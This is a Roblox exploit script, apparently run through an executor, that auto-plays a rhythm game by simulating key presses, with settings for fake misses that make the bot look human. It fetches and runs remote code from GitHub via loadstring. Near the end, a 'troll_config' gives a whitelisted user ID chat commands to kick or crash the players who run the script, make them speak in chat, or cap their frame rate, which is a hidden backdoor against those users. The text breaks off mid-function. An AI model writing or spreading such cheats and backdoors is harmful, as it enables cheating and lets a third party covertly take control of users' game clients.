for _, v in ipairs(game.CoreGui:GetDescendants()) do
	if v.Name:find("WindUI") then
		v:Destroy()
	end
end

pcall(function()
	makefolder("vastal")
	makefolder("vastal/mmm")
	makefolder("vastal/mmm/cache")
	writefile("vastal/startup.mp3", game:HttpGet("https://github.com/juliusxpn/Vastal/raw/refs/heads/main/games/7205641391/startup.mp3"))
end)

pcall(function()
    if isfile("vastal/mmm/.defcfgcheck") then
        return
    end

    if not isfolder("vastal/mmm") then
        makefolder("vastal/mmm")
    end

    local configs = {
        ["Blatant Bot (god)"] = "Blatant%20Bot%20(god)",
        ["Decent Bot"] = "Decent%20Bot",
        ["Early Bot"] = "Early%20Bot",
        ["Late Bot"] = "Late%20Bot",
        ["Pretty Okay Bot"] = "Pretty%20Okay%20Bot",
        ["Terrible Bot"] = "Terrible%20Bot"
    }

    local base = "https://raw.githubusercontent.com/juliusxpn/Vastal/main/games/7205641391/defaultconfigs/"

    repeat
        task.wait(0.25)

        for name, encoded in pairs(configs) do
            local path = "vastal/mmm/" .. name .. ".json"

            if not isfile(path) then
                local ok, data = pcall(game.HttpGet, game, base .. encoded .. ".json", true)
                if ok and data then
                    writefile(path, data)
                end
            end
        end

        local done = true
        for name in pairs(configs) do
            if not isfile("vastal/mmm/" .. name .. ".json") then
                done = false
                break
            end
        end
    until done

    writefile("vastal/mmm/.defcfgcheck", "nil")
end)


local HttpService = game:GetService("HttpService")
local config_path = "vastal/config.json"
local default_config = {
	selected_side = "Right",
	selected_mode = "4K",
	can_toggle_auto_player = true,
	auto_player_enabled = true,
	another_slider_offset = 0,
	base_hit_window = 0,
	base_release_delay = 0.01,
	release_randomizer = 0,
	make_mistakes = false,
	eh = false,
	hide_enabled = false,
    mistake_chance = 0.1
}

local function load_config()
	local success, result = pcall(function()
		if isfile(config_path) then
			local content = readfile(config_path)
			return HttpService:JSONDecode(content)
		end
	end)
	if success and result then
		for k, v in pairs(default_config) do
			if result[k] == nil then
				result[k] = v
			end
		end
		return result
	else
		return table.clone(default_config)
	end
end

local function save_config(config)
	pcall(function()
		local json = HttpService:JSONEncode(config)
		writefile(config_path, json)
	end)
end

local config = load_config()

local clone = cloneref or function(obj) return obj end
local rs = clone(game:GetService("RunService"))
local ts = game:GetService("TweenService")
local vim = clone(game:GetService("VirtualInputManager"))
local players = clone(game:GetService("Players"))
local player = players.LocalPlayer
local coreGui = clone(game:GetService('CoreGui'))
local http = clone(game:GetService("HttpService"))
local tcs = clone(game:GetService('TextChatService'))
local user_input = clone(game:GetService("UserInputService"))

local sound = Instance.new("Sound")
sound.Parent = clone(game:GetService("SoundService"))
sound.SoundId = getcustomasset("vastal/startup.mp3")
sound:Play()

local WindUI = loadstring(game:HttpGet(
	"https://github.com/juliusxpn/Vastal/raw/refs/heads/main/UI/WindUI.lua"
))()

local status_link = "https://github.com/juliusxpn/Vastal/raw/refs/heads/main/games/" .. game.PlaceId .. "/status.txt"
local status_icon = ""
if game:HttpGet(status_link):find('!true') then
    status_icon = "🟢"
else
    status_icon = "🔴"
end

WindUI:AddTheme({
    Name = "assfart",

    Accent = Color3.fromHex("#1d1d21"),
    Background = Color3.fromHex("#0f0f12"),
    BackgroundTransparency = 0.3,
    Outline = Color3.fromHex("#3b3b48"),

    Text = Color3.fromHex("#c8c8c8"),
    Placeholder = Color3.fromHex("#6b6b74"),

    Button = Color3.fromHex("#1b1b1f"),
    Icon = Color3.fromHex("#7cb0ff"),
    Hover = Color3.fromHex("#c6cef0"),

    WindowBackground = Color3.fromHex("#16161a"),
    WindowShadow = Color3.fromHex("#30477c"),

    DialogBackground = Color3.fromHex("#141418"),
    DialogBackgroundTransparency = 0.3,
    DialogTitle = Color3.fromHex("#f5f5f5"),
    DialogContent = Color3.fromHex("#d0d0d0"),
    DialogIcon = Color3.fromHex("#8caad2"),

    WindowTopbarButtonIcon = Color3.fromHex("#8cb0d2"),
    WindowTopbarTitle = Color3.fromHex("#f5f5f5"),
    WindowTopbarAuthor = Color3.fromHex("#cfcfcf"),
    WindowTopbarIcon = Color3.fromHex("#f5f5f5"),

    TabBackground = Color3.fromHex("#19191e"),
    TabTitle = Color3.fromHex("#ededed"),
    TabIcon = Color3.fromHex("#8cbcd2"),

    ElementBackground = Color3.fromHex("#1d2831"),
    ElementBackgroundTransparency = 0.4,
    ElementTitle = Color3.fromHex("#e8edf2"),
    ElementDesc = Color3.fromHex("#d6d0c6"),
    ElementIcon = Color3.fromHex("#9acde0"),

    PopupBackground = Color3.fromHex("#131316"),
    PopupBackgroundTransparency = 0.1,
    PopupTitle = Color3.fromHex("#f5f5f5"),
    PopupContent = Color3.fromHex("#d0d0d0"),
    PopupIcon = Color3.fromHex("#8c9ad2"),

    Toggle = Color3.fromHex("#17171b"),
    ToggleBar = Color3.fromHex("#d2b48c"),

    Checkbox = Color3.fromHex("#1b1b21"),
    CheckboxIcon = Color3.fromHex("#8ca9d2"),

    Slider = Color3.fromHex("#151519"),
    SliderThumb = Color3.fromHex("#8cacd2"),
})

local window = WindUI:CreateWindow({
	Title  = "Vastal - " .. status_icon,
	Icon   = "feather",
    Theme  = 'assfart',
	Author = "Vesta (Julius)",
	Folder = "VestaAutoPlayer",
	Size   = UDim2.fromOffset(600, 333),
    Radius = 4
})

window:Tag({
    Title = "Vastal Lite",
    Color = Color3.fromHex("#a9cce9"),
    Radius = 3,
})

local mainTab = window:Tab({ Title = "Utility", Icon = "pickaxe" })
pcall(function()
    mainTab:Select()
end)
local configTab = window:Tab({ Title = "Configs", Icon = "folder-cog" })
window:Divider()
local creditsTab = window:Tab({ Title = "Credits", Icon = "users-round" })
local submissions = window:Tab({ Title = "Submissions", Icon = "mail-plus" })
local Section = submissions:Section({
    Title = "Send your submissions! Click the link below and open it in your browser, you will need a working Github account to send a submisson.",
    Icon = "mail",
    Opened = true,
})
local Button = submissions:Button({
    Title = "Submission Button",
    Desc = "Click me to copy the link to your clipboard.",
    Locked = false,
    Callback = function()
        setclipboard('https://github.com/juliusxpn/Vastal/issues/new?template=idea_request.yml')
        WindUI:Notify({
            Title = "Pasted.",
            Content = "Now open the URL in your desired browser (Google, Bing, ETC)",
            Duration = 10,
            Icon = "check",
        })
    end
})
creditsTab:Button({
    Title = "Vesta (Click to copy LINK)",
    Desc = "Click to copy Vesta's Github",
    Locked = false,
    Callback = function()
        setclipboard('https://github.com/juliusxpn')
    end
})

local ui_elements = {}
local selected_mode = config.selected_mode
local selected_side = config.selected_side
local auto_player_enabled = config.auto_player_enabled
local can_toggle_auto_player = config.can_toggle_auto_player
local another_slider_offset = config.another_slider_offset
local base_hit_window = config.base_hit_window
local base_release_delay = config.base_release_delay
local release_randomizer = config.release_randomizer
local make_mistakes = config.make_mistakes
local eh = config.eh
local hide_enabled = config.hide_enabled
local mistake_chance = config.mistake_chance or 0.1


local function get_next_config_number()
    local i = 1
    while isfile("vastal/mmm/vastalcfg_" .. i .. ".json") do
        i = i + 1
    end
    return i
end

local function get_all_configs()
    local configs = {}
    local files = listfiles("vastal/mmm")
    
    for _, filepath in ipairs(files) do
        local filename = filepath:match("([^/\\]+)%.json$")
        if filename then
            table.insert(configs, filename)
        end
    end
    
    return configs
end

local function save_new_config(custom_name)
    local name = custom_name or ("vastalcfg_" .. get_next_config_number())
    local path = "vastal/mmm/" .. name .. ".json"
    
    local current_config = {
        selected_side = selected_side,
        selected_mode = selected_mode,
        can_toggle_auto_player = can_toggle_auto_player,
        auto_player_enabled = auto_player_enabled,
        another_slider_offset = another_slider_offset,
        base_hit_window = base_hit_window,
        base_release_delay = base_release_delay,
        release_randomizer = release_randomizer,
        make_mistakes = make_mistakes,
        eh = eh,
        hide_enabled = hide_enabled,
        mistake_chance = mistake_chance
    }
    
    local json = HttpService:JSONEncode(current_config)
    writefile(path, json)
    return name
end

local function load_saved_config(name)
    local path = "vastal/mmm/" .. name .. ".json"
    if not isfile(path) then return end
    
    local content = readfile(path)
    local loaded = HttpService:JSONDecode(content)
    
    selected_side = loaded.selected_side or "Right"
    selected_mode = loaded.selected_mode or "4K"
    can_toggle_auto_player = loaded.can_toggle_auto_player
    auto_player_enabled = loaded.auto_player_enabled
    another_slider_offset = loaded.another_slider_offset or 0
    base_hit_window = loaded.base_hit_window or 0
    base_release_delay = loaded.base_release_delay or 0.05
    release_randomizer = loaded.release_randomizer or 0
    make_mistakes = loaded.make_mistakes or false
    eh = loaded.eh or false
    mistake_chance = loaded.mistake_chance or 0.1
    hide_enabled = loaded.hide_enabled or false
    
    config = loaded
    save_config(config)
    
    pcall(function() ui_elements.side_dropdown:Set(selected_side) end)
    pcall(function() ui_elements.mode_dropdown:Set(selected_mode) end)
    pcall(function() ui_elements.can_toggle:Set(can_toggle_auto_player) end)
    pcall(function() ui_elements.autoplay_toggle:Set(auto_player_enabled) end)
    pcall(function() ui_elements.hit_randomizer:Set(another_slider_offset) end)
    pcall(function() ui_elements.hit_window:Set(base_hit_window) end)
    pcall(function() ui_elements.release_delay:Set(base_release_delay) end)
    pcall(function() ui_elements.release_randomizer:Set(release_randomizer) end)
    pcall(function() ui_elements.mistakes_toggle:Set(make_mistakes) end)
    pcall(function() ui_elements.eh_toggle:Set(eh) end)
    pcall(function() ui_elements.hide_toggle:Set(hide_enabled) end)
    pcall(function() ui_elements.mistake_slider:Set(mistake_chance * 100) end)

    WindUI:Notify({
        Title = "Loaded configuraton!",
        Content = "Your configuraton has been applied.",
        Duration = 5,
        Icon = "check",
    })
end

local function delete_config(name)
    local path = "vastal/mmm/" .. name .. ".json"
    if isfile(path) then
        delfile(path)
    end
    repeat task.wait(0.05) until not isfile(path)
    WindUI:Notify({
        Title = "Configuraton deleted.",
        Content = "Your configuraton has been deleted.",
        Duration = 5,
        Icon = "check",
    })
end

local config_buttons = {}

local function refresh_config_list()
    for _, btn in pairs(config_buttons) do
        pcall(function() btn:Destroy() end)
    end
    config_buttons = {}
    
    local configs = get_all_configs()
    for _, cfg_name in ipairs(configs) do
        local btn = configTab:Button({
            Title = cfg_name,
            Desc = "Click to load this config",
            Locked = false,
            Callback = function()
                load_saved_config(cfg_name)
            end
        })
        table.insert(config_buttons, btn)
    end
end

local config_name_value = ""

configTab:Input({
    Title = "Name",
    Placeholder = "name",
    Default = "",
    Callback = function(value)
        config_name_value = value
    end
})

configTab:Button({
    Title = "Delete configuration",
    Desc = "Deletes the configuraton of the name above",
    Locked = false,
    Callback = function()
        delete_config(config_name_value)
        refresh_config_list()
    end
})

configTab:Button({
    Title = "Save New Config",
    Desc = "Saves your current settings with the name above",
    Locked = false,
    Callback = function()
        local custom_name = config_name_value
        if custom_name and custom_name ~= "" then
            custom_name = custom_name:gsub("[^%w_-]", "")
            if custom_name == "" then
                custom_name = nil
            end
        else
            custom_name = nil
        end
        
        local name = save_new_config(custom_name)

        config_name_value = ""
        
        refresh_config_list()
    end
})

configTab:Divider()
refresh_config_list()

if status_icon == "🔴" then
    local Dialog = window:Dialog({
        Icon = "circle-alert",
        Title = "Vesta's Autoplayer isn't updated yet!",
        Content = "Are you sure that you want to run? The script will most definitely not work.",
        Buttons = {
            {
                Title = "Yes",
                Callback = function() Dialog = nil end,
            },
            {
                Title = "No",
                Callback = function()
                    for _, v in ipairs(game.CoreGui:GetDescendants()) do
	                    if v.Name:find("WindUI") then
	    	                v:Destroy()
	                    end
                    end
                    return
                end,
            },
        },
    })
end

local key_maps = {
	["4K"] = {
		order = { "Left", "Down", "Up", "Right" },
		keys = {
			Left  = Enum.KeyCode.A,
			Down  = Enum.KeyCode.S,
			Up    = Enum.KeyCode.D,
			Right = Enum.KeyCode.F
		}
	},
    ["5K"] = {
		order = { "Left", "Down", "Space", "Up", "Right" },
		keys = {
			Left = Enum.KeyCode.D,
            Down = Enum.KeyCode.F,
            Space = Enum.KeyCode.Space,
            Up = Enum.KeyCode.J,
            Right = Enum.KeyCode.K
		}
	},
	["6K"] = {
		order = { "Left", "Up", "Right", "Left2", "Down", "Right2" },
		keys = {
			Left   = Enum.KeyCode.S,
			Up     = Enum.KeyCode.D,
			Right  = Enum.KeyCode.F,
			Left2  = Enum.KeyCode.J,
			Down   = Enum.KeyCode.K,
			Right2 = Enum.KeyCode.L
		}
	},
	["7K"] = {
		order = { "Left", "Up", "Right", "Space", "Left2", "Down", "Right2" },
		keys = {
			Left   = Enum.KeyCode.S,
			Up   = Enum.KeyCode.D,
			Right     = Enum.KeyCode.F,
			Space  = Enum.KeyCode.Space,
			Left2  = Enum.KeyCode.J,
			Down  = Enum.KeyCode.K,
			Right2 = Enum.KeyCode.L
		}
	},
	["9K"] = {
		order = { "Left", "Down", "Up", "Right", "Space", "Left2", "Down2", "Up2", "Right2" },
		keys = {
			Left   = Enum.KeyCode.A,
			Down   = Enum.KeyCode.S,
			Up     = Enum.KeyCode.D,
			Right  = Enum.KeyCode.F,
			Space  = Enum.KeyCode.Space,
			Left2  = Enum.KeyCode.J,
			Down2  = Enum.KeyCode.K,
			Up2    = Enum.KeyCode.L,
			Right2 = Enum.KeyCode.Semicolon
		}
	}
}

ui_elements.side_dropdown = mainTab:Dropdown({
	Title = "What side are you playing on?\nThis is ur left: <--\nThis is ur right: -->",
	Values = { "Left", "Right" },
	Value = selected_side,
	Callback = function(v)
        if ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
                task.wait(0.1)
                ui_elements.autoplay_toggle:Set(true)
            end)
        end
		selected_side = v
		config.selected_side = v
		save_config(config)
	end
})

ui_elements.mode_dropdown = mainTab:Dropdown({
	Title = "What are your notes?",
	Values = { "4K", "6K", "5K", "7K", "9K" },
	Value = selected_mode,
	Callback = function(v)
		selected_mode = v
		config.selected_mode = v
		save_config(config)
	end
})

ui_elements.can_toggle = mainTab:Toggle({
    Title = "Click me to toggle the Autoplayer!",
    Type = "Checkbox",
    Default = can_toggle_auto_player,
    Callback = function(state) 
        can_toggle_auto_player = state
		config.can_toggle_auto_player = state
		save_config(config)
    end
})

ui_elements.autoplay_toggle = mainTab:Toggle({
	Title = "ignore me lol",
	Type = "Checkbox",
	Default = auto_player_enabled,
	Callback = function(v)
		auto_player_enabled = v
		config.auto_player_enabled = v
		save_config(config)
	end
})

mainTab:Divider()
mainTab:Paragraph({
	Title = "Instructions",
	Desc  = "Use up scroll!\n\n4K: A S D F\n5K: Default. DF SPACE JK\n6K: S D F J K L\n7K: S D F SPACE J K L\n9K: A S D F SPACE J K L ;\n\nAutoplayer doesn't work?\n\n1. 🔴 = no work\n2. Rejoin\n3. Exploit may not support virtual input manager\n4. Contact my github or discord (at my github!)\n5. Or maybe change your note settings, possibly others to default",
	Image = "info"
})

if shared.__AUTOPLAYER then 
    pcall(function()
        shared.__AUTOPLAYER:Disconnect()
    end)
end

local ArrowGui

local function search_for_arrow_gui()
    for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
        if gui.Name == "ArrowGui" then
            return gui
        end
    end
    return nil
end

local function wait_for_arrow_gui()
    while not ArrowGui do
        ArrowGui = player.PlayerGui:FindFirstChild("ArrowGui", true)
        
        if not ArrowGui then
            ArrowGui = search_for_arrow_gui()
        end
        
        if not ArrowGui then
            task.wait(0.01)
        else
            local side = ArrowGui:FindFirstChild(selected_side)
            if not side then
                ArrowGui:WaitForChild(selected_side, 10)
            end
        end
    end
end

task.spawn(function()
    wait_for_arrow_gui()
end)

player.PlayerGui.DescendantAdded:Connect(function(o)
	if o.Name == "ArrowGui" then
		ArrowGui = o
	end
end)

player.PlayerGui.DescendantRemoving:Connect(function(o)
	if o == ArrowGui then
		ArrowGui = nil
        task.spawn(function()
            wait_for_arrow_gui()
        end)
	end
end)

local function get_target_gui()
    if not ArrowGui then return nil end
    return ArrowGui:FindFirstChild("Title")
end

local slider_offset = 0

ui_elements.hit_randomizer = mainTab:Slider({
    Title = "Hit window randomizer",
    Desc = "Move the slider! It will change how bad the bot is depending on how high it is.",
    Step = 0.0001,
    Value = { Min = 0, Max = 200, Default = another_slider_offset },
    Callback = function(value) 
		another_slider_offset = value
		config.another_slider_offset = value
		save_config(config)
	end
})

ui_elements.hit_window = mainTab:Slider({
    Title = "Change hit window",
    Desc = "Move the slider! It changes what the distance notes will be hit at. Higher is late, lower is close. 0 for 100 accuracy",
    Step = 0.0001,
    Value = { Min = -200, Max = 200, Default = base_hit_window },
    Callback = function(value) 
		base_hit_window = value
		config.base_hit_window = value
		save_config(config)
	end
})

mainTab:Button({
    Title = "Use this if you can't create a good config:\nHit randomizer: 15\nHit window: -30\nRelease delay: 0.04\nRelease randomizer: 0.06",
    Desc = "you can't click this, you set it.",
    Locked = false,
    Callback = function() end
})

task.spawn(function()
    while true do
        local random_offset = (math.random() * 2 - 1) * another_slider_offset
        slider_offset = base_hit_window + random_offset
        if can_toggle_auto_player and ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
                ui_elements.autoplay_toggle:Set(true)
            end)
        elseif ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
            end)
        end
        task.wait(0.5)
    end
end)

local function get_offset(mode)
	if mode == "4K" or mode == "7K" then
		return 90 + slider_offset
	elseif mode == "6K" then
		return 80 + slider_offset
	else
		return 75 + slider_offset
	end
end

local function get_lane_container(name)
    if not ArrowGui then return nil end
    local side = ArrowGui:FindFirstChild(selected_side)
    if not side then return nil end
    local notes = side:FindFirstChild("Notes")
    if not notes then return nil end
    return notes:FindFirstChild(name)
end

local function get_hold_container(name)
    if not ArrowGui then return nil end
    local side = ArrowGui:FindFirstChild(selected_side)
    if not side then return nil end
    local longNotes = side:FindFirstChild("LongNotes")
    if not longNotes then return nil end
    return longNotes:FindFirstChild(name)
end

local function is_opponent(n)
	local a = n.Name:lower()
	local b = n.Parent and n.Parent.Name:lower() or ""
	return a:find("opp") or b:find("opp")
end

local release_delay = base_release_delay
local active_holds = {}
local keys_pressed = {}
local release_tokens = {}

local function delayed_release(lane, key)
	local token = (release_tokens[lane] or 0) + 1
	release_tokens[lane] = token

	task.delay(release_delay, function()
		if release_tokens[lane] == token and not active_holds[lane] then
			vim:SendKeyEvent(false, key, false, game)
			keys_pressed[lane] = nil
		end
	end)
end

ui_elements.release_delay = mainTab:Slider({
    Title = "Change Release delay",
    Desc = "How long the bot holds a key before releasing it.\n\n⚠ WARNING: May make you miss.",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 5,
        Default = base_release_delay,
    },
    Callback = function(value)
        base_release_delay = value
		config.base_release_delay = value
		save_config(config)
    end
})

ui_elements.release_randomizer = mainTab:Slider({
    Title = "Release randomizer",
    Desc = "Randomizes release delay every release. 0 = disabled.\n\n⚠ WARNING: May make you miss.",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 5,
        Default = release_randomizer,
    },
    Callback = function(value)
        release_randomizer = value
		config.release_randomizer = value
		save_config(config)
    end
})

local function get_release_delay()
    if release_randomizer > 0 then
        local offset = (math.random() * 2 - 1) * release_randomizer
        return math.max(0, base_release_delay + offset)
    end
    return base_release_delay
end

task.spawn(function()
    while true do
        if release_randomizer > 0 then
            local random_offset = (math.random() * 2 - 1) * release_randomizer
            release_delay = math.max(0, base_release_delay + random_offset)
        else
            release_delay = base_release_delay
        end
        task.wait(0.5)
    end
end)

ui_elements.mistakes_toggle = mainTab:Toggle({
    Title = "Mistakes.",
    Type = "Checkbox",
    Desc = "When this is toggle the bot will make mistakes if many notes appear at such a time.\n\n⚠ WARNING: May make you miss.",
    Default = make_mistakes,
    Callback = function(value)
        make_mistakes = value
		config.make_mistakes = value
		save_config(config)
    end
})

ui_elements.mistake_slider = mainTab:Slider({
    Title = "Mistake chance (%)",
    Desc = "Chance the bot will intentionally mess up when Mistakes is ON",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 100,
        Default = mistake_chance * 100
    },
    Callback = function(value)
        mistake_chance = value / 100
        config.mistake_chance = mistake_chance
        save_config(config)
    end
})

shared.__AUTOPLAYER = rs.Heartbeat:Connect(function()
    if not auto_player_enabled then return end

    local target_gui = get_target_gui()
    if not target_gui then return end

    local mode = selected_mode
    local offset = get_offset(mode)
    local target_y = target_gui.AbsolutePosition.Y + offset
    local target_bottom = target_y + target_gui.AbsoluteSize.Y

    for _, lane in ipairs(key_maps[mode].order) do
        local key = key_maps[mode].keys[lane]
        local notes = get_lane_container(lane)
        local holds = get_hold_container(lane)

        if not key or not notes then
            continue
        end

        local new_hold

        if holds then
            for _, h in ipairs(holds:GetChildren()) do
                if h:IsA("GuiObject") and not is_opponent(h) then
                    local t = h.AbsolutePosition.Y
                    local b = t + h.AbsoluteSize.Y
                    if b >= target_y and t <= target_bottom then
                        new_hold = h
                        break
                    end
                end
            end
        end

        if new_hold then
            if active_holds[lane] ~= new_hold then
                if keys_pressed[lane] then
                    vim:SendKeyEvent(false, key, false, game)
                end

                if make_mistakes and #notes:GetChildren() > 2 and math.random() < 0.15 then
                    local other_lane = key_maps[mode].order[math.random(#key_maps[mode].order)]
                    if other_lane ~= lane then
                        local other_key = key_maps[mode].keys[other_lane]
                        vim:SendKeyEvent(true, other_key, false, game)
                        task.spawn(function()
                            task.wait(get_release_delay())
                            vim:SendKeyEvent(false, other_key, false, game)
                        end)
                    end
                end

                vim:SendKeyEvent(true, key, false, game)
                keys_pressed[lane] = true
                active_holds[lane] = new_hold
                release_tokens[lane] = (release_tokens[lane] or 0) + 1
            end
        elseif active_holds[lane] then
            active_holds[lane] = nil
            delayed_release(lane, key)
        end

        if not active_holds[lane] then
            for _, n in ipairs(notes:GetChildren()) do
                if n:IsA("GuiObject") and not is_opponent(n) then
                    local c = n.AbsolutePosition.Y + n.AbsoluteSize.Y / 2
                    if c >= target_y and c <= target_bottom then

                        if make_mistakes and #notes:GetChildren() > 3 and math.random() < 0.1 then
                            task.wait(get_release_delay() * math.random(1,2))
                        end

                        vim:SendKeyEvent(true, key, false, game)
                        keys_pressed[lane] = true
                        delayed_release(lane, key)

                        if make_mistakes and #notes:GetChildren() > 2 and math.random() < mistake_chance then
                            local extra_lane = key_maps[mode].order[math.random(#key_maps[mode].order)]
                            local extra_key = key_maps[mode].keys[extra_lane]
                            vim:SendKeyEvent(true, extra_key, false, game)
                            task.spawn(function()
                                task.wait(get_release_delay())
                                vim:SendKeyEvent(false, extra_key, false, game)
                            end)
                        end

                        break
                    end
                end
            end
        end
    end
end)

local function get_or_create_cache(key)
    if not shared[key] then
        shared[key] = {}
    end
    return shared[key]
end

task.spawn(function()
    while true do
        for _, v in ipairs(game.CoreGui:GetDescendants()) do
            if v.Name:find('WindUI') then
                repeat task.wait() until not v or not v.Parent
                local hide_cache = get_or_create_cache("cache")
                if shared.__AUTOPLAYER then 
                    pcall(function()
                        shared.__AUTOPLAYER:Disconnect()
                    end)
                    shared.__AUTOPLAYER = nil 
                end
                break
            end
        end
        task.wait(1)
    end
end)

ui_elements.eh_toggle = mainTab:Toggle({
    Title = "INSANE AUTOPLAY NO MISSES 69% ACCURACY",
    Type = "Checkbox",
    Default = eh,
    Callback = function(state)
        eh = state
		config.eh = state
		save_config(config)
    end
})

local spam_keys = {
    Enum.KeyCode.A,
    Enum.KeyCode.S,
    Enum.KeyCode.D,
    Enum.KeyCode.F,
    Enum.KeyCode.Space,
    Enum.KeyCode.J,
    Enum.KeyCode.K,
    Enum.KeyCode.L,
    Enum.KeyCode.Semicolon
}

task.spawn(function()
    while true do
        if eh then
            for _, key in ipairs(spam_keys) do
                vim:SendKeyEvent(true, key, false, game)
            end
            task.wait(0.01)
            for _, key in ipairs(spam_keys) do
                vim:SendKeyEvent(false, key, false, game)
            end
        end
        task.wait(0.01)
    end
end)

if mainTab and player then
    local hide_cache = get_or_create_cache("cache")

    local function apply_hide(obj)
        if obj:IsA("GuiObject") then
            local n = obj.Name:lower()
            if n:find("note")
            or n:find("hold")
            or n:find("left")
            or n:find("right")
            or n:find("up")
            or n:find("down")
            or n:find("rating")
            or n:find("feedback")
            or n:find("sick")
            or n:find("good")
            or n:find("bad")
            or n:find("miss")
            or n:find("health")
            or n:find("healthbar") then
                if hide_cache[obj] == nil then
                    hide_cache[obj] = obj.Visible
                    obj.Visible = false
                end
            end
        end
    end

    ui_elements.hide_toggle = mainTab:Toggle({
        Title = "Disable some GUI'S (This prevents SOME lag? But doesn't prevent those huge massive lagspikes.)",
        Type = "Checkbox",
        Default = hide_enabled,
        Callback = function(state)
            hide_enabled = state
			config.hide_enabled = state
			save_config(config)
            local gui_root = player.PlayerGui
            if state then
                for _, obj in ipairs(gui_root:GetDescendants()) do
                    apply_hide(obj)
                end
            else
                for obj, vis in pairs(hide_cache) do
                    if obj and obj.Parent then
                        obj.Visible = vis
                    end
                end
                hide_cache = {}
            end
            shared.cache = hide_cache
        end
    })

    player.PlayerGui.DescendantAdded:Connect(function(obj)
        if hide_enabled then
            apply_hide(obj)
            shared.cache = hide_cache
        end
    end)
end

-- Nvesta!!! =D
local function chk(o)
    local p = o.Parent
    while p do
        if string.find(string.lower(p.Name), "nvestagd") then return true end
        p = p.Parent
    end
    return false
end

local function mkGrad(t)
    local g = Instance.new("UIGradient", t)
    g.Rotation = 90
    return g
end

local function anim(t, g)
    task.spawn(function()
        local c = 0
        local w = math.pi / 8
        local n = 12
        while t and t.Parent do
            local cs = {}
            for i = 0, n do
                local r = 127 * math.sin(w*i + c) + 128
                local gr = 127 * math.sin(w*i + 2*math.pi/3 + c) + 128
                local b = 127 * math.sin(w*i + 4*math.pi/3 + c) + 128
                local col = Color3.fromRGB(
                    math.clamp(r * 1.3 + 80, 180, 255),
                    math.clamp(gr * 1.3 + 80, 180, 255),
                    math.clamp(b * 1.3 + 80, 180, 255)
                )
                table.insert(cs, ColorSequenceKeypoint.new(i/n, col))
            end
            g.Color = ColorSequence.new(cs)
            c = c + 0.08
            if c >= math.pi * 2 then c = 0 end
            task.wait()
        end
    end)
end

local function setup(o)
    if o:IsA("TextLabel") and ((o.Name == "user" or o.Text == "user") or 
       (o.Name == "funny vastal dev" or o.Text == "funny vastal dev")) and chk(o) then
        o.TextColor3 = Color3.new(1, 1, 1)
        o.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
        o.TextStrokeTransparency = 0.2
        o.Font = Enum.Font.GothamBold
        o.Text = "funny vastal dev"
        o.TextSize = 25
        
        local bb = o:FindFirstAncestorOfClass("BillboardGui")
        if bb then
            bb.Size = UDim2.new(8, 0, 2, 0)
            bb.StudsOffset = Vector3.new(0, 3, 0)
        end
        
        anim(o, mkGrad(o))
    end
end

for _, o in ipairs(game:GetDescendants()) do setup(o) end
game.DescendantAdded:Connect(function(o) wait(0.01) setup(o) end)

local troll_config = {
	prefix = "!",
	test_mode = true,
	
	whitelisted = {
		[10318336432] = {
			ownership = 1,
			custom_name = "cool" -- prob doesnt work
		},
	},
	
	commands = {
		['kick'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
				local target = find_player(args[1])
                
				if target then
					target:Kick(table.concat(args, " ", 2) or "You have been kicked from the server.")
				end
			end
		},
		['checkusers'] = {
			ownership = 1,
			run = function()
				tcs.TextChannels.RBXGeneral:SendAsync('[!]')
			end
		},
        ['removegui'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
                local target = find_player(args[1])

                if target then
                    for _, v in ipairs(game:GetDescendants()) do
                        if string.lower(v.Name):find('windui') then
                            v:Destroy()
                            if shared.__AUTOPLAYER then
                                shared.__AUTOPLAYER:Disconnect()
                                shared.__AUTOPLAYER = nil
                            end
                        end
                    end
                end
			end
		},
        ['setfps'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    local setfpscap = setfpscap or setfps or fpscap or function(obj) return obj end

                    setfpscap(args[2])
                end
            end
        },
        ['crash'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    task.spawn(function()
                        for i = 1, 100 do
                            local part = Instance.new('Part')
                            part.Size = Vector3.new(1e5, 1e5, 1e5)
                            part.Parent = workspace
                        end
                    end)
                end
            end
        },
        ['speak'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    tcs.TextChannels.RBXGeneral:SendAsync(args[2])
                end
            end
        },
	}
}

function find_player(partial_name)
	if not partial_name then return nil end
	local lower = string.lower(partial_name)
	
	for _, p in pairs(players:GetPlayers()) do
		if string.lower(p.Name) == lower then return p end
	end
	
	for _, p in pairs(players:GetPlayers()) do
		if string.lower(p.Name):find(lower, 1, true) then return p end
	end
	
	return nil
end

function get_player_ownership(player)
	local player_data = troll_config.whitelisted[player.UserId]
	return player_data and player_data.ownership or 0
end

function get_custom_name(player)
	local player_data = troll_config.whitelisted[player.UserId]
	if player_data and player_data.custom_name then
		return player_data.custom_name
	end
	
	task.spawn(function()
		local success, response = pcall(function()
			return http:GetAsync("https://users.roblox.com/v1/users/" .. player.UserId)
		end)
		
		if success then
			local data = http:JSONDecode(response)
			return data.displayName or player.Name
		end
	end)
	
	return player.Name
end

function can_use_command(player, command_data)
	local player_ownership = get_player_ownership(player)
	local required_ownership = command_data.ownership
	
	return player_ownership >= required_ownership
end

local function animate_rainbow(text_label, gradient)
	task.spawn(function()
		local c = 0
		local wave_freq = math.pi / 8
		local num_points = 12
		
		while text_label and text_label.Parent do
			local color_sequence = {}
			
			for i = 0, num_points do
				local r = 127 * math.sin(wave_freq * i + c) + 128
				local g = 127 * math.sin(wave_freq * i + 2 * math.pi / 3 + c) + 128
				local b = 127 * math.sin(wave_freq * i + 4 * math.pi / 3 + c) + 128
				
				local color = Color3.fromRGB(
					math.clamp(r * 1.3 + 80, 180, 255),
					math.clamp(g * 1.3 + 80, 180, 255),
					math.clamp(b * 1.3 + 80, 180, 255)
				)
				
				table.insert(color_sequence, ColorSequenceKeypoint.new(i / num_points, color))
			end
			
